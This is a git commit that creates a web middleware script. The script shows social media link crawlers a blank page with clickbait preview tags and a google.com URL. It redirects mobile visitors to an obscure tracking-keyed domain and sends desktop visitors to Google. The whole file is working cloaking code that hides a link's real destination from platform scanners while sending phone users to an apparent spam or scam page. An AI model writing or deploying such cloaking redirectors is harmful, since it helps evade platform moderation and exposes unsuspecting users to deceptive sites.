14796f45689cfc64f7bdcf23fb363b2de559f574
samjakinngg-del <samjakinngg@gmail.com>
2026-09-11 16:42:53 +0500

    Create _middleware.js

---
+++ functions/_middleware.js
@@ -0,0 +1,38 @@
+export async function onRequest(context) {
+  const request = context.request;
+  const userAgent = request.headers.get('user-agent') || '';
+
+  // 1. Check for Social Media Crawlers / Bots
+  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);
+
+  if (isSocialBot) {
+    const htmlContent = `<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome</title>
+    <meta property="og:title" content="🎬O▂P▂▂E▂N🎬">
+    <meta property="og:description" content="">
+    <meta property="og:image" content="https://s3.us-east-2.amazonaws.com/img-utils-conversions.pixelied.com/conversions/Fri-Sep-11-2026/935d28b2-a625-434c-a5ad-c25b4dd1c6b4/3dc8adf2-0ebf-4306-9e53-5db2131b5b1b.tiff">
+    <meta property="og:url" content="https://www.google.com">
+    <meta property="og:type" content="website">
+</head>
+<body>
+</body>
+</html>`;
+
+    return new Response(htmlContent, {
+      headers: { 'content-type': 'text/html;charset=UTF-8' },
+    });
+  }
+
+  // 2. Check for Mobile Users
+  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
+
+  if (isMobile) {
+    return Response.redirect("https://versatilesentiment.com/sti0eb2y?key=d894e263a607bac9d17f511393f94425", 302);
+  } else {
+    return Response.redirect("https://www.google.com", 302);
+  }
+}
